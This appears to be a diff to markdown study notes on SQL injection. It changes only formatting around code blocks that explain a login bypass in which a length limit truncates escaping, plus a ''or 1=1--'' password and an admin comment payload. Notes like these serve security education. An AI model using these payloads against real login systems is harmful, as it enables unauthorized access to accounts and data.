@@ -282,12 +282,12 @@ SELECT * FROM users WHERE username = ´admin´´--´ and password = ´´;
       * `{{[a]*127}}`
   * App adds another `'`, but the length limit removes it
   * This causes a SQL syntax error
-      * ```SQL
+      ```SQL
       SELECT * FROM users WHERE username = '{{[a]*127}}'' and password = 'foo'
       ```
   * Submit the same username, and a password of `or 1=1--`
   * Query becomes this, bypassing the login:
-      * ```SQL
+      ```SQL
       SELECT * FROM users WHERE username = '{{[a]*127}}'' and password = 'or 1=1--'
       ```
   * `''` is interpreted as a literal `'`, not a metacharacter
